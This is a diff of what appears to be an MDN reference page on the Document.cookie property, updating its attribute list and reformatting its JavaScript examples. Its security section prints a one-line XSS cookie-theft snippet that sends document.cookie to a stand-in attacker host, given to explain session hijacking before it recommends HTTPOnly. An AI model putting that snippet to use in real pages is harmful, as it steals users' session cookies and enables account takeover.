@@ -1,16 +1,8 @@
 ---
-title: Document.cookie
+title: "Document: cookie property"
+short-title: cookie
 slug: Web/API/Document/cookie
 page-type: web-api-instance-property
-tags:
-  - API
-  - Document
-  - HTML DOM
-  - JS
-  - NeedsMarkupWork
-  - Reference
-  - Storage
-  - cookie
 browser-compat: api.Document.cookie
 ---
 
@@ -42,33 +34,19 @@ not abide by this.
 document.cookie = newCookie;
 ```
 
-In the code above, `newCookie` is a string of form
-`key=value`. Note that you can only set/update a
-single cookie at a time using this method. Consider also that:
+In the code above, `newCookie` is a string of form `key=value`, specifying the cookie to set/update. Note that you can only set/update a single cookie at a time using this method. Consider also that:
 
 - Any of the following cookie attribute values can optionally follow the key-value
-  pair, specifying the cookie to set/update, and preceded by a semicolon separator:
-
-  - `;path=path` (e.g., '`/`',
-    '`/mydir`') If not specified, defaults to the current path
-    of the current document location.
+  pair, each preceded by a semicolon separator:
 
   - `;domain=domain` (e.g.,
-    '`example.com`' or '`subdomain.example.com`'). If
-    not specified, this defaults to the host portion of the current document
-    location. Contrary to earlier specifications, leading dots in domain names
-    are ignored, but browsers may decline to set the cookie containing such
-    dots. If a domain is specified, subdomains are always included.
+    '`example.com`' or '`subdomain.example.com`'): The host to which the cookie will be sent. If not specified, this defaults to the host portion of the current document location. Contrary to earlier specifications, leading dots in domain names are ignored, but browsers may decline to set the cookie containing such dots. If a domain is specified, subdomains are always included.
 
     > **Note:** The domain _must_ match
     > the domain of the JavaScript origin. Setting cookies to foreign
     > domains will be silently ignored.
 
-  - `;max-age=max-age-in-seconds` (e.g.,
-    `60*60*24*365` or 31536000 for a year)
-  - `;expires=date-in-GMTString-format` If neither
-    `expires` nor `max-age` specified it will expire at
-    the end of session.
+  - `;expires=date-in-GMTString-format`: The expiry date of the cookie. If neither `expires` nor `max-age` specified it will expire at the end of session.
 
     > **Warning:** When user privacy is a concern, it's important that any web app
     > implementation invalidate cookie data after a certain timeout
@@ -76,16 +54,19 @@ single cookie at a time using this method. Consider also that:
     > users specify that cookies should never expire, which is not
     > necessarily safe.
 
-    - See {{jsxref("Date.toUTCString()")}} for help formatting this
-      value.
+    See {{jsxref("Date.toUTCString()")}} for help formatting this
+    value.
 
-  - `;secure` Cookie to only be transmitted
-    over secure protocol as https. Before Chrome 52, this flag could appear
-    with cookies from http domains.
-  - `;samesite` [SameSite](/en-US/docs/Web/HTTP/Cookies#samesite_cookies)
-    prevents the browser from sending this cookie along with cross-site
-    requests. Possible values are `lax`,
-    `strict` or `none`.
+  - `;max-age=max-age-in-seconds`: The maximum age of the cookie in seconds (e.g.,
+    `60*60*24*365` or 31536000 for a year).
+
+  - `;partitioned`: Indicates that the cookie should be stored using partitioned storage. See [Cookies Having Independent Partitioned State (CHIPS)](/en-US/docs/Web/Privacy/Partitioned_cookies) for more details.
+
+  - `;path=path`: Indicates the path that must exist in the requested URL for the browser to send the {{httpheader("Cookie")}} header (e.g., '`/`',
+    '`/mydir`'). If not specified, it defaults to the current path of the current document location.
+
+  - `;samesite`: [SameSite](/en-US/docs/Web/HTTP/Cookies#samesite_cookies) prevents the browser from sending this cookie along with cross-site
+    requests. Possible values are `lax`, `strict` or `none`.
 
     - The `lax` value will send the cookie for all same-site
       requests and top-level navigation GET requests. This is sufficient
@@ -97,6 +78,8 @@ single cookie at a time using this method. Consider also that:
     - The `none` value explicitly states no restrictions will
       be applied. The cookie will be sent in all requests—both
       cross-site and same-site.
+
+  - `;secure`: Specifies that the cookie should only be transmitted over a secure protocol.
 
 - The cookie value string can use {{jsxref("Global_Objects/encodeURIComponent",
   "encodeURIComponent()")}} to ensure that the string does not contain any commas,
@@ -133,13 +116,13 @@ document.cookie = "name=oeschger; SameSite=None; Secure";
 document.cookie = "favorite_food=tripe; SameSite=None; Secure";
 
 function showCookies() {
-  const output = document.getElementById('cookies')
-  output.textContent = `> ${document.cookie}`
+  const output = document.getElementById("cookies");
+  output.textContent = `> ${document.cookie}`;
 }
 
 function clearOutputCookies() {
-  const output = document.getElementById('cookies')
-  output.textContent = ''
+  const output = document.getElementById("cookies");
+  output.textContent = "";
 }
 ```
 
@@ -166,18 +149,18 @@ document.cookie = "test1=Hello; SameSite=None; Secure";
 document.cookie = "test2=World; SameSite=None; Secure";
 
 const cookieValue = document.cookie
-  .split('; ')
-  .find((row) => row.startsWith('test2='))
-  ?.split('=')[1];
+  .split("; ")
+  .find((row) => row.startsWith("test2="))
+  ?.split("=")[1];
 
 function showCookieValue() {
-  const output = document.getElementById('cookie-value')
-  output.textContent = `> ${cookieValue}`
+  const output = document.getElementById("cookie-value");
+  output.textContent = `> ${cookieValue}`;
 }
 
 function clearOutputCookieValue() {
-  const output = document.getElementById('cookie-value')
-  output.textContent = ''
+  const output = document.getElementById("cookie-value");
+  output.textContent = "";
 }
 ```
 
@@ -200,21 +183,26 @@ In order to use the following code, please replace all occurrences of the word
 
 ```js
 function doOnce() {
-  if (!document.cookie.split('; ').find((row) => row.startsWith('doSomethingOnlyOnce'))) {
+  if (
+    !document.cookie
+      .split("; ")
+      .find((row) => row.startsWith("doSomethingOnlyOnce"))
+  ) {
     // Note that we are setting `SameSite=None;` in this example because the example
     // needs to work cross-origin.
     // It is more common not to set the `SameSite` attribute, which results in the default,
     // and more secure, value of `SameSite=Lax;`
-    document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";
+    document.cookie =
+      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";
 
-    const output = document.getElementById('do-once')
-    output.textContent = '> Do something here!'
+    const output = document.getElementById("do-once");
+    output.textContent = "> Do something here!";
   }
 }
 
 function clearOutputDoOnce() {
-  const output = document.getElementById('do-once')
-  output.textContent = ''
+  const output = document.getElementById("do-once");
+  output.textContent = "";
 }
 ```
 
@@ -238,15 +226,16 @@ function resetOnce() {
   // needs to work cross-origin.
   // It is more common not to set the `SameSite` attribute, which results in the default,
   // and more secure, value of `SameSite=Lax;`
-  document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";
+  document.cookie =
+    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";
 
-  const output = document.getElementById('reset-once')
-  output.textContent = '> Reset!'
+  const output = document.getElementById("reset-once");
+  output.textContent = "> Reset!";
 }
 
 function clearOutputResetOnce() {
-  const output = document.getElementById('reset-once')
-  output.textContent = ''
+  const output = document.getElementById("reset-once");
+  output.textContent = "";
 }
 ```
 
@@ -272,15 +261,17 @@ function clearOutputResetOnce() {
 document.cookie = "reader=1; SameSite=None; Secure";
 
 function checkACookieExists() {
-  if (document.cookie.split(';').some((item) => item.trim().startsWith('reader='))) {
-    const output = document.getElementById('a-cookie-existence')
-    output.textContent = '> The cookie "reader" exists'
+  if (
+    document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
+  ) {
+    const output = document.getElementById("a-cookie-existence");
+    output.textContent = '> The cookie "reader" exists';
   }
 }
 
 function clearOutputACookieExists() {
-  const output = document.getElementById('a-cookie-existence')
-  output.textContent = ''
+  const output = document.getElementById("a-cookie-existence");
+  output.textContent = "";
 }
 ```
 
@@ -300,15 +291,15 @@ function clearOutputACookieExists() {
 
 ```js
 function checkCookieHasASpecificValue() {
-  if (document.cookie.split(';').some((item) => item.includes('reader=1'))) {
-    const output = document.getElementById('a-specific-value-of-the-cookie')
-    output.textContent = '> The cookie "reader" has a value of "1"'
+  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
+    const output = document.getElementById("a-specific-value-of-the-cookie");
+    output.textContent = '> The cookie "reader" has a value of "1"';
   }
 }
 
 function clearASpecificValueOfTheCookie() {
-  const output = document.getElementById('a-specific-value-of-the-cookie')
-  output.textContent = ''
+  const output = document.getElementById("a-specific-value-of-the-cookie");
+  output.textContent = "";
 }
 ```
 
@@ -340,7 +331,7 @@ session. Stealing a cookie from a web application leads to hijacking the
 authenticated user's session. Common ways to steal cookies include using [social engineering](<https://en.wikipedia.org/wiki/Social_engineering_(security)>) or by exploiting a [cross-site scripting](/en-US/docs/Glossary/Cross-site_scripting) (XSS) vulnerability in the application -
 
 ```js
-(new Image()).src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
+new Image().src = `http://www.evil-domain.com/steal-cookie.php?cookie=${document.cookie}`;
 ```
 
 The `HTTPOnly` cookie attribute can help to mitigate this attack by
